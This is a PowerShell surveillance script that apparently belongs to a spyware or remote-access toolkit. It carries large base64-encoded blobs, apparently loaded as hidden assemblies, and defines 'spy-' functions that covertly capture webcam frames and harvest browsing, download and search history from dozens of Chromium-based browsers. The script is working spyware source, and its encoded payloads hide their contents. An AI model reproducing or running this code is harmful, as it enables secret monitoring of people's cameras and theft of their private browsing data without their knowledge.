g7gfPzjke0Cm2aYQZm66aOSzm+c/Ft0E0ou0Al9EZEN22wbfiucZms6ki83jSlXoToRLid6MWolmrJ4UgexrfGZWIsg0zcDbQR390EDhF5Av8hQtdnibxA5GUib1CQAiJ4ajnQyro8UE+/JcITAyYc0DDTGpo2ypnFDKSD6nSBdygDdGv8iRtdFljC0Ke7p7stLxqaGcsOuwJL4DHQIyNcIgM2Knkj5CzxR6TEH8n4nEuJMqEpBcoMwxsFJtUa4wk2Rm5t7AYKtzYal+V22NBRMOi2kgLJllglAIGwqYB8Q0RTVWAjKavAukBbcditYXrY6I8H2koQGymr8kpPWEOqgT6oUrqw577AiZgH4CWwjqtjHaYeTads69B9NDO0SR1IChYjSipi6B+MzEoyCTD370OQoiIuCM0UgVMpjvJK0l6kpTT8XD5CXFWEbCOWvGyjhCRSJVSuAEiR/SDjNIETLbF8YZfFYpoVoP2g2VAkqwRXKFT4kArahm8osRJ0Dq9kwVlKaFMkPFHFSuxC/KKB4i380R/F5Y+TXiW1aFEvyYgDaYqgCClcy0n6J75LmQrspmJbJVQRiOkilZ2LKBEo/pLAxpJySoTmQWqNksoChSpp2i4Me5QT/vvSpLJiDkDQoiK93A+3SowBckehkTCVkWYQTAaWmgY2llBVUwVRusNUmzQ53FuCzirZa0tgSiFemgyoTonhnG/knHOXoXJtpOqnOYA+8EHFuVZVHz6ctyLYVaDwXMiVuA+zFSHHG5LgSCwaWoiVupFFZYauxKAtKS/BBEXNPPFsObzQ1CUrGVJqYYxkmfKNqiIz10yl36+ud8sCj1Ey5SUovmHZ+ENQyl5JpYzStpCqbcOVaogGOZIpp9IGJm7nflXIWSjEXCkjfYbD6dQAyBe8stXIvS7TZWls+uM+YVBxN9JsCSuDeWK4B36kEAqDK4bQPugRnictPAiNaK0i1AddpfJp1V0RqCMjIvDf6qIIXwtfm4RziZzojrCiiEBREG5j3AY/lZjYyJlGG34Oi/93W/Avm/XpobNwlo+73p07QPhxyxT+B089io+fMXfx7UwCv19Y07VwSVNLy6LGhpbGjq6GpqbBxoaOprauhsbGjsau9qamtvYFCzGfZv7JNBukzQmy+KhBsj5bjxE5+VzY0bykcSGy0dy2pNWJc+AoPhcs7GhbCNjQ2LGYfHYtaehsbOmAz+bGju7Gzo5Fi/AfG+SzvWXJgo7WJYhz8YJGSr25oaOzm3xSnMhbSxt+bZZ8Nre3tTa2NTc3LOhsU6l3Lm7pdFLvWtKWn3rLsVNva+9qaWpE2dtaF3ZKn+2LFiNgY0dHYyOeIW5fgP+SyImz+dhxSp8dC+Fz8F/x2d597DhbFnYuamlra27oau5qI5/dDW2drUiisa1xQffCriXdeMg7N/X2fzWfnU3v7xOdSr7wmxFgZcAoAg40NjRGuYADsYb+xpYoB4xuauyP5iRBPtuRmWP5bKRXUyP1pUZETKQrw8lXa37jHiPb7HNB86JmNGNDa3OXaty2phb0SW7c1s7OtgX476OcfC46dj4Xdi5c0Nzd3Q1P3UsaWrupwzR3LG5obF64sHPB4kVdi9rwP75cogWL2psWtHY0NHcuaGlobW9vRT7RZ5csWtTS1Nq2pLu7Df+uRD47m9oXdja3dTZ0dnQi9camjobOhe08AJHPllb0dPwFTU6Ttb5/2eWveyzSRPOKRBgP1eBennAqc1Pb/DDuSglPftQjjM37NLby6Q9z6uXfXPCrm3j+RecjX205/rBx1ZVILh7G/fC4L5HN5ViMby2l17uz+cc6/t/r//df+KMUWmutw2D7f6///3v9bw=="

$devices={[AForge.Video.DirectShow.FilterInfoCollection]::new([Guid]::new("860bb310-5d01-11d0-bd3b-00a0c911ce86"))}
function spy-cam {
	param($num)
	[cam]::captured = $false
	$videoSource = [AForge.Video.DirectShow.VideoCaptureDevice]::new((&$devices)[$num].MonikerString)
	$handler = [Delegate]::CreateDelegate(
		[AForge.Video.NewFrameEventHandler],
		[cam].GetMethod("VideoSource_NewFrame")
	)
	$videoSource.add_NewFrame($handler)

	try {
		$videoSource.Start()
		$null = [cam]::WaitHandle.WaitOne()
	}
	finally {
		$videoSource.remove_NewFrame($handler)

		if ($videoSource.IsRunning) {
			$videoSource.SignalToStop()
			$videoSource.WaitForStop()
		}
	}

}
function spy-getcam {
	if ((&$devices).count -eq 0) {
		"No Cameras Found!"
	}
	else {
		$i = 0
		(&$devices) | % {
			[pscustomobject]@{
				DeviceName = $_.Name
				DeviceNumber = $i
			} 
			$i++
		}
	}
}
# from https://github.com/arsium/ChromeHistory
$ChromiumPaths = [Collections.Generic.Dictionary[[string],[string]]]::new()
$ChromiumPaths.Add("Chrome", "$env:LocalAppData\Google\Chrome\User Data")
$ChromiumPaths.Add("AVG Browser", "$env:LocalAppData\AVG\Browser\User Data")
$ChromiumPaths.Add("Kinza", "$env:LocalAppData\Kinza\User Data")
$ChromiumPaths.Add("URBrowser", "$env:LocalAppData\URBrowser\User Data")
$ChromiumPaths.Add("AVAST Software", "$env:LocalAppData\AVAST Software\Browser\User Data")
$ChromiumPaths.Add("SalamWeb", "$env:LocalAppData\SalamWeb\User Data")
$ChromiumPaths.Add("CCleaner", "$env:LocalAppData\CCleaner Browser\User Data")
$ChromiumPaths.Add("Opera", "$env:AppData\Opera Software\Opera Stable")
$ChromiumPaths.Add("Yandex", "$env:LocalAppData\Yandex\YandexBrowser\User Data")
$ChromiumPaths.Add("Slimjet", "$env:LocalAppData\Slimjet\User Data")
$ChromiumPaths.Add("360 Browser", "$env:LocalAppData\360Chrome\Chrome\User Data")
$ChromiumPaths.Add("Comodo Dragon", "$env:LocalAppData\Comodo\Dragon\User Data")
$ChromiumPaths.Add("CoolNovo", "$env:LocalAppData\MapleStudio\ChromePlus\User Data")
$ChromiumPaths.Add("Chromium | SRWare Iron Browser", "$env:LocalAppData\Chromium\User Data")
$ChromiumPaths.Add("Torch Browser", "$env:LocalAppData\Torch\User Data")
$ChromiumPaths.Add("Brave Browser", "$env:LocalAppData\BraveSoftware\Brave-Browser\User Data")
$ChromiumPaths.Add("Iridium Browser", "$env:LocalAppData\Iridium\User Data")
$ChromiumPaths.Add("Opera Neon", "$env:LocalAppData\Opera Software\Opera Neon\User Data")
$ChromiumPaths.Add("7Star", "$env:LocalAppData\7Star\7Star\User Data")
$ChromiumPaths.Add("Amigo", "$env:LocalAppData\Amigo\User Data")
$ChromiumPaths.Add("Blisk", "$env:LocalAppData\Blisk\User Data")
$ChromiumPaths.Add("CentBrowser", "$env:LocalAppData\CentBrowser\User Data")
$ChromiumPaths.Add("Chedot", "$env:LocalAppData\Chedot\User Data")
$ChromiumPaths.Add("CocCoc", "$env:LocalAppData\CocCoc\Browser\User Data")
$ChromiumPaths.Add("Elements Browser", "$env:LocalAppData\Elements Browser\User Data")
$ChromiumPaths.Add("Epic Privacy Browser", "$env:LocalAppData\Epic Privacy Browser\User Data")
$ChromiumPaths.Add("Kometa", "$env:LocalAppData\Kometa\User Data")
$ChromiumPaths.Add("Orbitum", "$env:LocalAppData\Orbitum\User Data")
$ChromiumPaths.Add("Sputnik", "$env:LocalAppData\Sputnik\Sputnik\User Data")
$ChromiumPaths.Add("uCozMedia", "$env:LocalAppData\uCozMedia\Uran\User Data")
$ChromiumPaths.Add("Vivaldi", "$env:LocalAppData\Vivaldi\User Data")
$ChromiumPaths.Add("Sleipnir 6", "$env:AppData\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
$ChromiumPaths.Add("Citrio", "$env:LocalAppData\CatalinaGroup\Citrio\User Data")
$ChromiumPaths.Add("Coowon", "$env:LocalAppData\Coowon\Coowon\User Data")
$ChromiumPaths.Add("Liebao Browser", "$env:LocalAppData\liebao\User Data")
$ChromiumPaths.Add("QIP Surf", "$env:LocalAppData\QIP Surf\User Data")
$ChromiumPaths.Add("Edge Chromium", "$env:LocalAppData\Microsoft\Edge\User Data")
load "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"
function GetDateFromWebkitTime {
	param($s)
	$value = [Convert]::ToDouble($s) * 1E-06
	[DateTime]$dateTime = [DateTime]::new(1601, 1, 1)
	try {
		$dateTime.Add([TimeSpan]::FromSeconds($value))
	}
	catch {}
	return $dateTime
}

function GetAllProfiles {
	param($DirectoryPath)
	$list = @()
	$list += $DirectoryPath + "\Default\History"
	$list += $DirectoryPath + "\History"
	if (Test-Path $DirectoryPath) {
		foreach ($text in [IO.Directory]::GetDirectories($DirectoryPath)) {
			if ($text.Contains("Profile")) {
				$list += $text + "\History"
			}
		}
	}
	return $list
}

function History_Recovery {
	param($path, $browser)
	$list = [Collections.Generic.List[PSCustomObject]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("urls")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$data = [PSCustomObject]@{
					browser = $browser
					Title = $sqliteHandler.GetValue($j, "title")
					URL = $sqliteHandler.GetValue($j, "url")
					visit_count = $sqliteHandler.GetValue($j, "visit_count")
					last_visit_Time = GetDateFromWebkitTime($sqliteHandler.GetValue($j, "last_visit_Time"))
				}
				$list.Add($data)
			}
		}
		return $list
	}
}
function Downloads_Recovery {
	param($path, $browser)
	$list = [Collections.Generic.List[PSCustomObject]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("downloads")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$data = [PSCustomObject]@{
					browser = $browser
					tab_url = $sqliteHandler.GetValue($j, "tab_url")
					target_path = $sqliteHandler.GetValue($j, "target_path")
					total_bytes = $sqliteHandler.GetValue($j, "total_bytes")
					start_time = GetDateFromWebkitTime($sqliteHandler.GetValue($j, "start_time"))
				}
				$list.Add($data)
			}
		}
		return ($list | Format-List)
	}
}
function keywordSearchTermsHistory {
	param($path, $browser)
	$list = [Collections.Generic.List[string]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("keyword_search_terms")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$term = $sqliteHandler.GetValue($j, "term")
				$list.Add($term)
			}
		}
		return $list
	}
}
function spy-browsinghistory {
	$list = [Collections.Generic.List[object]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) {
		try {
			$list.AddRange((History_Recovery $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return ($list | Format-List)
}
function spy-downloadhistory {
	$list = [Collections.Generic.List[object]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) { 
		try {
			$list.AddRange((Downloads_Recovery $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return ($list | Format-List)
}
function spy-searchhistory {
	$list = [Collections.Generic.List[string]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) {
		try {
			$list.AddRange((keywordSearchTermsHistory $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return $list
}